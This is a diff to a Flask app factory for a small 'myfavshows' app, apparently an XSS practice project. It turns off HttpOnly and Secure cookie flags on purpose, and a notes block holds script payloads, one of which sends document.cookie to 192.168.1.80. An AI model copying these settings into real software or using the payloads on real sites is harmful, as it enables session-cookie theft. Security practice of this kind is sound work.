@@ -9,6 +9,9 @@ def create_app(test_config=None):
     app.config.from_mapping(
         SECRET_KEY='dev',
         DATABASE=os.path.join(app.instance_path, 'myfavshows.sqlite'),
+        SESSION_COOKIE_HTTPONLY=False,
+        REMEMBER_COOKIE_HTTPONLY=False,
+        SESSION_COOKIE_SECURE=False,
     )
 
     if test_config is None:
@@ -25,19 +28,19 @@ def create_app(test_config=None):
         pass
 
     # App context imports
-    import db
+    from . import db
     db.init_app(app)
 
-    import auth
+    from . import auth
     app.register_blueprint(auth.bp)
 
-    import search
+    from . import search
     app.register_blueprint(search.bp)
 
-    import myfav
+    from . import myfav
     app.register_blueprint(myfav.bp)
 
-    import myshow
+    from . import myshow
     app.register_blueprint(myshow.bp)
 
     from . import blog
@@ -63,5 +66,5 @@ flask run
 
 <script>alert('test');</script>
 <script>document.write('<img src="http://localhost/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
-<script>new Image().src="http://localhost/readcookie.php?"+document.cookie;</script>
+<script>new Image().src="http://192.168.1.80/b.php?cookie="+document.cookie;</script>
 """
